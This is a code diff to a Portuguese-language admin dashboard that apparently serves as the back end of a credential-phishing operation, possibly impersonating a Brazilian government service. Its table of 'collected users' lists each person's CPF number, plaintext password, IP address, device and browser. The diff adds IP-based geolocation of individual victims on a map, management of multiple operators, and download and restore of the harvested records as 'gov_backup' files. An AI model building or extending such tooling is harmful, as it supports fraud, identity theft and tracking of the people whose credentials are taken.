@@ -260,6 +260,11 @@
             border: 1px solid rgba(239, 68, 68, 0.2);
             color: #f87171;
         }
+        .alert-success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
         .form-group {
             margin-bottom: 16px;
         }
@@ -269,7 +274,7 @@
             font-size: 12px;
             margin-bottom: 6px;
         }
-        input {
+        input, select {
             width: 100%;
             padding: 12px 14px;
             background: rgba(255, 255, 255, 0.05);
@@ -279,7 +284,7 @@
             font-family: 'Outfit', sans-serif;
             font-size: 14px;
         }
-        input:focus {
+        input:focus, select:focus {
             outline: none;
             border-color: rgba(255, 255, 255, 0.2);
             background: rgba(255, 255, 255, 0.08);
@@ -307,6 +312,14 @@
         .btn-primary:hover {
             background: linear-gradient(135deg, #ffffff 0%, #f5f5f5 100%);
             transform: translateY(-1px);
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #fff;
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.15);
         }
         .security-badge {
             display: flex;
@@ -412,6 +425,7 @@
         .header-actions {
             display: flex;
             gap: 12px;
+            flex-wrap: wrap;
         }
         .logout-btn {
             background: rgba(255, 255, 255, 0.05);
@@ -466,6 +480,7 @@
             cursor: pointer;
             border-radius: 8px;
             font-size: 13px;
+            transition: all 0.2s;
         }
         .tab:hover {
             border-color: rgba(255, 255, 255, 0.15);
@@ -491,6 +506,11 @@
             padding-bottom: 12px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.06);
             color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .table-wrapper {
             overflow-x: auto;
@@ -498,6 +518,7 @@
         table {
             width: 100%;
             border-collapse: collapse;
+            min-width: 600px;
         }
         th, td {
             padding: 12px 10px;
@@ -512,6 +533,7 @@
         td {
             color: rgba(255, 255, 255, 0.7);
             font-size: 13px;
+            word-break: break-word;
         }
         .badge {
             display: inline-block;
@@ -543,6 +565,10 @@
             color: #f87171;
             cursor: pointer;
             font-size: 12px;
+            transition: all 0.2s;
+        }
+        .btn-danger:hover {
+            background: rgba(239, 68, 68, 0.3);
         }
         .btn-clear {
             background: rgba(245, 158, 11, 0.15);
@@ -551,6 +577,10 @@
             border-radius: 8px;
             color: #f59e0b;
             cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-clear:hover {
+            background: rgba(245, 158, 11, 0.3);
         }
         .search-box {
             display: flex;
@@ -620,7 +650,7 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ========== ESTILOS DO MAPA ========== */
+        /* Estilos do mapa */
         .map-container {
             background: rgba(0, 0, 0, 0.6);
             border-radius: 14px;
@@ -628,7 +658,7 @@
             margin-top: 20px;
             border: 1px solid rgba(255, 255, 255, 0.08);
         }
-        #locationMap, #userMap {
+        #userMap {
             height: 350px;
             width: 100%;
             border-radius: 12px;
@@ -664,26 +694,16 @@
             margin-top: 4px;
         }
         .ip-highlight {
-            background: rgba(16, 185, 129, 0.15);
-            border-radius: 6px;
-            padding: 4px 8px;
             cursor: pointer;
-            transition: all 0.2s;
-            display: inline-block;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(16, 185, 129, 0.1);
+            padding: 4px 8px;
+            border-radius: 6px;
         }
         .ip-highlight:hover {
-            background: rgba(16, 185, 129, 0.3);
-            transform: scale(1.02);
-        }
-        .map-marker-btn {
-            cursor: pointer;
-            margin-left: 6px;
-            color: #10b981;
-            transition: all 0.2s;
-        }
-        .map-marker-btn:hover {
-            color: #34d399;
-            transform: scale(1.1);
+            background: rgba(16, 185, 129, 0.2);
         }
 
         @media (max-width: 768px) {
@@ -742,7 +762,11 @@
                 color: white;
                 font-size: 20px;
             }
-            #locationMap, #userMap {
+            .section-title {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            #userMap {
                 height: 250px;
             }
             .location-card {
@@ -882,25 +906,12 @@
                 <div class="section-title">ÚLTIMAS ATIVIDADES</div>
                 <div id="ultimasAtividades"></div>
             </div>
-            <!-- Mapa da Localização do Admin -->
-            <div class="section-card">
-                <div class="section-title"><i class="fas fa-map-marker-alt"></i> MINHA LOCALIZAÇÃO</div>
-                <div class="map-container">
-                    <div id="locationMap"></div>
-                    <div class="location-info" id="locationInfo">
-                        <div class="location-card"><i class="fas fa-network-wired"></i><span class="label">Meu IP</span><span class="value" id="myIP">Carregando...</span></div>
-                        <div class="location-card"><i class="fas fa-map-pin"></i><span class="label">Localização</span><span class="value" id="myLocation">Carregando...</span></div>
-                        <div class="location-card"><i class="fas fa-globe"></i><span class="label">Coordenadas</span><span class="value" id="myCoords">Carregando...</span></div>
-                        <div class="location-card"><i class="fas fa-building"></i><span class="label">ISP</span><span class="value" id="myISP">Carregando...</span></div>
-                    </div>
-                </div>
-            </div>
         </div>
 
         <!-- Usuários Tab -->
         <div id="tabUsers" class="tab-content">
             <div class="section-card">
-                <div class="section-title" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
+                <div class="section-title">
                     <span>LISTA DE USUÁRIOS COLETADOS</span>
                     <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                         <div class="search-box">
@@ -920,11 +931,11 @@
                     </table>
                 </div>
             </div>
-            <!-- Mapa do Usuário Selecionado -->
+            <!-- Mapa do Usuário -->
             <div class="section-card" id="userMapSection" style="display: none;">
                 <div class="section-title">
-                    <i class="fas fa-user-secret"></i> LOCALIZAÇÃO: <span id="selectedUserCpf"></span>
-                    <button onclick="fecharMapaUsuario()" style="float: right; background: none; border: none; color: #f87171; cursor: pointer;">
+                    <i class="fas fa-map-marker-alt"></i> LOCALIZAÇÃO: <span id="selectedUserCpf"></span>
+                    <button onclick="fecharMapaUsuario()" style="background: none; border: none; color: #f87171; cursor: pointer;">
                         <i class="fas fa-times"></i> Fechar
                     </button>
                 </div>
@@ -940,7 +951,7 @@
             <div class="section-card">
                 <div class="section-title">
                     HISTÓRICO COMPLETO
-                    <div class="search-box" style="float: right; width: auto;">
+                    <div class="search-box" style="width: auto;">
                         <i class="fas fa-search"></i>
                         <input type="text" id="searchLogs" placeholder="Buscar..." onkeyup="filterLogs()">
                     </div>
@@ -962,15 +973,45 @@
             </div>
         </div>
 
-        <!-- Configurações Tab -->
+        <!-- Configurações Tab (MELHORADA) -->
         <div id="tabSettings" class="tab-content">
             <div class="section-card">
-                <div class="section-title">ALTERAR SENHA DO ADMIN</div>
+                <div class="section-title"><i class="fas fa-key"></i> ALTERAR SENHA DO ADMIN</div>
                 <div style="display: flex; gap: 12px; flex-wrap: wrap;">
-                    <input type="password" id="novaSenhaAdmin" placeholder="Nova senha" style="flex: 1;">
+                    <input type="password" id="novaSenhaAdmin" placeholder="Nova senha (mínimo 6 caracteres)" style="flex: 1;">
                     <button class="btn-primary" style="width: auto; margin-top: 0;" onclick="alterarSenhaAdmin()">ALTERAR SENHA</button>
                 </div>
                 <div id="senhaMsg" style="margin-top: 15px;"></div>
+            </div>
+
+            <div class="section-card">
+                <div class="section-title"><i class="fas fa-user-plus"></i> ADICIONAR NOVO ADMIN</div>
+                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                    <input type="text" id="novoAdminUser" placeholder="Nome do usuário" style="flex: 1;">
+                    <input type="password" id="novoAdminPass" placeholder="Senha" style="flex: 1;">
+                    <button class="btn-secondary" style="width: auto; margin-top: 0;" onclick="adicionarAdmin()">ADICIONAR ADMIN</button>
+                </div>
+                <div id="adminMsg" style="margin-top: 15px;"></div>
+            </div>
+
+            <div class="section-card">
+                <div class="section-title"><i class="fas fa-list"></i> LISTA DE ADMINISTRADORES</div>
+                <div class="table-wrapper">
+                    <table>
+                        <thead><tr><th>Usuário</th><th>Ação</th></tr></thead>
+                        <tbody id="adminsTable"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="section-card">
+                <div class="section-title"><i class="fas fa-database"></i> BACKUP DOS DADOS</div>
+                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+                    <button class="btn-secondary" style="width: auto; margin-top: 0;" onclick="fazerBackup()"><i class="fas fa-download"></i> BAIXAR BACKUP</button>
+                    <button class="btn-clear" style="width: auto; margin-top: 0;" onclick="restaurarBackup()"><i class="fas fa-upload"></i> RESTAURAR BACKUP</button>
+                </div>
+                <input type="file" id="backupFile" accept=".json" style="display: none;" onchange="processarRestauracao()">
+                <div id="backupMsg" style="margin-top: 15px;"></div>
             </div>
         </div>
 
@@ -1039,9 +1080,7 @@
     });
 
     // ========== FUNÇÕES GERAIS ==========
-    let map = null;
     let userMap = null;
-    let myMarker = null;
 
     function toggleSidebar() {
         document.getElementById('sidebar').classList.toggle('open');
@@ -1059,118 +1098,6 @@
     setTimeout(() => {
         document.getElementById('loadingScreen').classList.add('hidden');
     }, 1500);
-
-    function copyToClipboard(text) {
-        navigator.clipboard.writeText(text);
-        showToast('IP copiado!', 'success');
-    }
-
-    // Função para buscar localização por IP
-    async function buscarLocalizacaoPorIP(ip, callback) {
-        try {
-            const response = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await response.json();
-            callback(data);
-        } catch (error) {
-            console.error('Erro ao buscar IP:', error);
-            callback(null);
-        }
-    }
-
-    // Inicializar mapa da localização atual
-    function initMyLocation() {
-        if (map) map.remove();
-        map = L.map('locationMap').setView([-15.7939, -47.8828], 4);
-        
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> & CartoDB',
-            subdomains: 'abcd',
-            maxZoom: 18
-        }).addTo(map);
-        
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                const ip = data.ip;
-                document.getElementById('myIP').innerHTML = `<code>${ip}</code> <i class="fas fa-copy" style="cursor:pointer; margin-left:5px;" onclick="copyToClipboard('${ip}')"></i>`;
-                
-                buscarLocalizacaoPorIP(ip, (location) => {
-                    if (location && location.latitude && location.longitude) {
-                        const lat = location.latitude;
-                        const lon = location.longitude;
-                        map.setView([lat, lon], 13);
-                        
-                        if (myMarker) myMarker.remove();
-                        myMarker = L.marker([lat, lon]).addTo(map)
-                            .bindPopup(`<b>Você está aqui!</b><br>IP: ${ip}<br>${location.city || ''}, ${location.region || ''}`)
-                            .openPopup();
-                        
-                        document.getElementById('myLocation').innerHTML = `${location.city || 'N/A'}, ${location.region || 'N/A'} - ${location.country_name || 'N/A'}`;
-                        document.getElementById('myCoords').innerHTML = `${lat}, ${lon}`;
-                        document.getElementById('myISP').innerHTML = location.org || location.asn || 'N/A';
-                    } else {
-                        document.getElementById('myLocation').innerHTML = 'Não foi possível localizar';
-                        document.getElementById('myCoords').innerHTML = '-';
-                        document.getElementById('myISP').innerHTML = '-';
-                    }
-                });
-            })
-            .catch(err => {
-                document.getElementById('myLocation').innerHTML = 'Erro ao buscar IP';
-            });
-    }
-
-    // Mostrar localização de um usuário específico
-    function mostrarLocalizacaoUsuario(cpf, ip) {
-        if (!ip || ip === '-' || ip === 'unknown') {
-            showToast(`Não há IP registrado para o CPF ${formatarCPF(cpf)}`, 'error');
-            return;
-        }
-        
-        document.getElementById('selectedUserCpf').innerHTML = formatarCPF(cpf);
-        document.getElementById('userMapSection').style.display = 'block';
-        
-        if (userMap) userMap.remove();
-        userMap = L.map('userMap').setView([-15.7939, -47.8828], 4);
-        
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; OSM & CartoDB',
-            subdomains: 'abcd',
-            maxZoom: 18
-        }).addTo(userMap);
-        
-        buscarLocalizacaoPorIP(ip, (location) => {
-            const infoDiv = document.getElementById('userLocationInfo');
-            
-            if (location && location.latitude && location.longitude) {
-                const lat = location.latitude;
-                const lon = location.longitude;
-                userMap.setView([lat, lon], 13);
-                
-                L.marker([lat, lon]).addTo(userMap)
-                    .bindPopup(`<b>Usuário: ${formatarCPF(cpf)}</b><br>IP: ${ip}<br>${location.city || ''}, ${location.region || ''}<br>${location.country_name || ''}`)
-                    .openPopup();
-                
-                infoDiv.innerHTML = `
-                    <div class="location-card"><i class="fas fa-map-pin"></i><span class="label">Localização</span><span class="value">${location.city || 'N/A'}, ${location.region || 'N/A'}</span></div>
-                    <div class="location-card"><i class="fas fa-globe"></i><span class="label">País</span><span class="value">${location.country_name || 'N/A'} ${location.country_code ? `(${location.country_code})` : ''}</span></div>
-                    <div class="location-card"><i class="fas fa-chart-line"></i><span class="label">Coordenadas</span><span class="value">${lat}, ${lon}</span></div>
-                    <div class="location-card"><i class="fas fa-building"></i><span class="label">ISP</span><span class="value">${location.org || location.asn || 'N/A'}</span></div>
-                    <div class="location-card"><i class="fas fa-clock"></i><span class="label">Fuso Horário</span><span class="value">${location.timezone || 'N/A'}</span></div>
-                    <div class="location-card"><i class="fas fa-flag-checkered"></i><span class="label">Região</span><span class="value">${location.region_code || location.region || 'N/A'}</span></div>
-                `;
-            } else {
-                infoDiv.innerHTML = `<div class="location-card" style="width:100%; text-align:center;"><i class="fas fa-exclamation-triangle"></i><span class="value">Não foi possível localizar o IP ${ip}</span></div>`;
-                userMap.setView([-15.7939, -47.8828], 2);
-            }
-        });
-    }
-
-    function fecharMapaUsuario() {
-        document.getElementById('userMapSection').style.display = 'none';
-        if (userMap) userMap.remove();
-        userMap = null;
-    }
 
     // ========== SIDEBAR ==========
     function initSidebar() {
@@ -1234,7 +1161,7 @@
                 document.getElementById('adminPanel').classList.add('visible');
                 initSidebar();
                 loadAllData();
-                setTimeout(() => initMyLocation(), 500);
+                carregarAdmins();
                 if (refreshInterval) clearInterval(refreshInterval);
                 refreshInterval = setInterval(() => { if (adminToken) loadAllData(); }, 10000);
                 showToast(`Welcome back, ${username}!`, 'success');
@@ -1265,7 +1192,7 @@
         adminToken = sessionStorage.getItem('adminToken');
         document.getElementById('loginScreen').style.display = 'none';
         document.getElementById('adminPanel').classList.add('visible');
-        setTimeout(() => { initSidebar(); loadAllData(); setTimeout(() => initMyLocation(), 500); }, 100);
+        setTimeout(() => { initSidebar(); loadAllData(); carregarAdmins(); }, 100);
         refreshInterval = setInterval(() => { if (adminToken) loadAllData(); }, 10000);
     }
 
@@ -1276,6 +1203,65 @@
             return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
         }
         return cpf;
+    }
+
+    // Função para buscar localização por IP
+    function buscarLocalizacaoPorIP(ip, callback) {
+        fetch(`https://ipapi.co/${ip}/json/`)
+            .then(res => res.json())
+            .then(data => callback(data))
+            .catch(() => callback(null));
+    }
+
+    // Mostrar localização do usuário
+    function mostrarLocalizacaoUsuario(cpf, ip) {
+        if (!ip || ip === '-' || ip === 'unknown') {
+            showToast(`Não há IP registrado para o CPF ${formatarCPF(cpf)}`, 'error');
+            return;
+        }
+        
+        document.getElementById('selectedUserCpf').innerHTML = formatarCPF(cpf);
+        document.getElementById('userMapSection').style.display = 'block';
+        
+        if (userMap) userMap.remove();
+        userMap = L.map('userMap').setView([-15.7939, -47.8828], 4);
+        
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OSM & CartoDB',
+            subdomains: 'abcd',
+            maxZoom: 18
+        }).addTo(userMap);
+        
+        buscarLocalizacaoPorIP(ip, (location) => {
+            const infoDiv = document.getElementById('userLocationInfo');
+            
+            if (location && location.latitude && location.longitude && location.latitude !== 'None') {
+                const lat = location.latitude;
+                const lon = location.longitude;
+                userMap.setView([lat, lon], 13);
+                
+                L.marker([lat, lon]).addTo(userMap)
+                    .bindPopup(`<b>CPF: ${formatarCPF(cpf)}</b><br>IP: ${ip}<br>${location.city || ''}, ${location.region || ''}`)
+                    .openPopup();
+                
+                infoDiv.innerHTML = `
+                    <div class="location-card"><i class="fas fa-id-card"></i><span class="label">CPF</span><span class="value">${formatarCPF(cpf)}</span></div>
+                    <div class="location-card"><i class="fas fa-network-wired"></i><span class="label">IP</span><span class="value"><code>${ip}</code></span></div>
+                    <div class="location-card"><i class="fas fa-map-pin"></i><span class="label">Localização</span><span class="value">${location.city || 'N/A'}, ${location.region || 'N/A'}</span></div>
+                    <div class="location-card"><i class="fas fa-globe"></i><span class="label">País</span><span class="value">${location.country_name || 'N/A'}</span></div>
+                    <div class="location-card"><i class="fas fa-chart-line"></i><span class="label">Coordenadas</span><span class="value">${lat}, ${lon}</span></div>
+                    <div class="location-card"><i class="fas fa-building"></i><span class="label">ISP</span><span class="value">${location.org || location.asn || 'N/A'}</span></div>
+                `;
+            } else {
+                infoDiv.innerHTML = `<div class="location-card"><i class="fas fa-exclamation-triangle"></i><span class="value">Não foi possível localizar o IP ${ip}</span></div>`;
+            }
+        });
+    }
+
+    function fecharMapaUsuario() {
+        document.getElementById('userMapSection').style.display = 'none';
+        if (userMap) userMap.remove();
+        userMap = null;
     }
 
     // ========== CARREGAR DADOS ==========
@@ -1318,12 +1304,11 @@
         }
         tbody.innerHTML = users.map(u => {
             const ip = u.ip || u.ip_senha || '-';
-            const ipDisplay = ip !== '-' ? `<code>${ip}</code> <i class="fas fa-map-marker-alt map-marker-btn" onclick="mostrarLocalizacaoUsuario('${u.cpf}', '${ip}')" title="Ver localização"></i> <i class="fas fa-copy map-marker-btn" onclick="copyToClipboard('${ip}')" title="Copiar IP"></i>` : ip;
             return `
                 <tr>
                     <td><strong>${formatarCPF(u.cpf)}</strong></td>
                     <td class="badge-warning" style="font-family: monospace;">${u.senha || '--------'}</td>
-                    <td class="ip-highlight">${ipDisplay}</td>
+                    <td class="ip-highlight" onclick="mostrarLocalizacaoUsuario('${u.cpf}', '${ip}')"><code>${ip}</code> <i class="fas fa-map-marker-alt"></i></td>
                     <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
                     <td>${u.navegador || u.navegador_senha || '-'}</td>
                     <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
@@ -1435,11 +1420,148 @@
         showToast('CSV exportado', 'success');
     }
 
+    function fazerBackup() {
+        const backup = {
+            usuarios: allUsers,
+            logs: allLogs,
+            data: new Date().toISOString()
+        };
+        const blob = new Blob([JSON.stringify(backup, null, 2)], { type: 'application/json' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = `gov_backup_${new Date().toISOString().slice(0,19)}.json`;
+        link.click();
+        showToast('Backup gerado com sucesso!', 'success');
+    }
+
+    function restaurarBackup() {
+        document.getElementById('backupFile').click();
+    }
+
+    function processarRestauracao(event) {
+        const file = document.getElementById('backupFile').files[0];
+        if (!file) return;
+        
+        const reader = new FileReader();
+        reader.onload = async function(e) {
+            try {
+                const backup = JSON.parse(e.target.result);
+                if (backup.usuarios && backup.logs) {
+                    // Enviar para o servidor restaurar
+                    const res = await fetch('/api/admin/restore', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': `Bearer ${adminToken}`
+                        },
+                        body: JSON.stringify(backup)
+                    });
+                    if (res.ok) {
+                        showToast('Backup restaurado com sucesso!', 'success');
+                        loadAllData();
+                    } else {
+                        showToast('Erro ao restaurar backup', 'error');
+                    }
+                } else {
+                    showToast('Arquivo inválido', 'error');
+                }
+            } catch (error) {
+                showToast('Erro ao processar backup', 'error');
+            }
+        };
+        reader.readAsText(file);
+    }
+
+    async function carregarAdmins() {
+        if (!adminToken) return;
+        try {
+            const res = await fetch('/api/admin/list', {
+                headers: { 'Authorization': `Bearer ${adminToken}` }
+            });
+            const data = await res.json();
+            const tbody = document.getElementById('adminsTable');
+            if (data.admins && data.admins.length) {
+                tbody.innerHTML = data.admins.map(admin => `
+                    <tr>
+                        <td><i class="fas fa-user-shield"></i> ${admin.username}</td>
+                        <td>${admin.username !== 'admin' ? `<button class="btn-danger" onclick="removerAdmin('${admin.username}')">REMOVER</button>` : '<span class="badge">Principal</span>'}</td>
+                    </tr>
+                `).join('');
+            } else {
+                tbody.innerHTML = '<tr><td colspan="2">Nenhum admin encontrado</td></tr>';
+            }
+        } catch (error) {
+            console.error('Erro ao carregar admins:', error);
+        }
+    }
+
+    async function adicionarAdmin() {
+        const username = document.getElementById('novoAdminUser').value.trim();
+        const password = document.getElementById('novoAdminPass').value.trim();
+        const msgDiv = document.getElementById('adminMsg');
+        
+        if (!username || !password || password.length < 6) {
+            msgDiv.innerHTML = '<span style="color: #f87171;">❌ Usuário e senha (mínimo 6 caracteres) são obrigatórios</span>';
+            setTimeout(() => msgDiv.innerHTML = '', 3000);
+            return;
+        }
+        
+        try {
+            const res = await fetch('/api/admin/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${adminToken}`
+                },
+                body: JSON.stringify({ username, password })
+            });
+            const data = await res.json();
+            if (data.success) {
+                msgDiv.innerHTML = '<span style="color: #10b981;">✅ Admin adicionado com sucesso!</span>';
+                document.getElementById('novoAdminUser').value = '';
+                document.getElementById('novoAdminPass').value = '';
+                carregarAdmins();
+                setTimeout(() => msgDiv.innerHTML = '', 3000);
+            } else {
+                msgDiv.innerHTML = `<span style="color: #f87171;">❌ ${data.error}</span>`;
+                setTimeout(() => msgDiv.innerHTML = '', 3000);
+            }
+        } catch (error) {
+            msgDiv.innerHTML = '<span style="color: #f87171;">❌ Erro ao adicionar admin</span>';
+            setTimeout(() => msgDiv.innerHTML = '', 3000);
+        }
+    }
+
+    async function removerAdmin(username) {
+        if (username === 'admin') {
+            showToast('Não é possível remover o admin principal!', 'error');
+            return;
+        }
+        if (!confirm(`Remover admin ${username}?`)) return;
+        
+        try {
+            const res = await fetch(`/api/admin/remove/${username}`, {
+                method: 'DELETE',
+                headers: { 'Authorization': `Bearer ${adminToken}` }
+            });
+            const data = await res.json();
+            if (data.success) {
+                showToast('Admin removido!', 'success');
+                carregarAdmins();
+            } else {
+                showToast(data.error || 'Erro ao remover', 'error');
+            }
+        } catch (error) {
+            showToast('Erro ao remover admin', 'error');
+        }
+    }
+
     async function alterarSenhaAdmin() {
         const novaSenha = document.getElementById('novaSenhaAdmin').value;
         const msgDiv = document.getElementById('senhaMsg');
         if (!novaSenha || novaSenha.length < 6) {
             msgDiv.innerHTML = '<span style="color: #f87171;">❌ Senha deve ter pelo menos 6 caracteres</span>';
+            setTimeout(() => msgDiv.innerHTML = '', 3000);
             return;
         }
         try {
@@ -1458,9 +1580,11 @@
                 setTimeout(() => msgDiv.innerHTML = '', 3000);
             } else {
                 msgDiv.innerHTML = `<span style="color: #f87171;">❌ ${data.error}</span>`;
+                setTimeout(() => msgDiv.innerHTML = '', 3000);
             }
         } catch (error) {
             msgDiv.innerHTML = '<span style="color: #f87171;">❌ Erro ao alterar senha</span>';
+            setTimeout(() => msgDiv.innerHTML = '', 3000);
         }
     }
 </script>
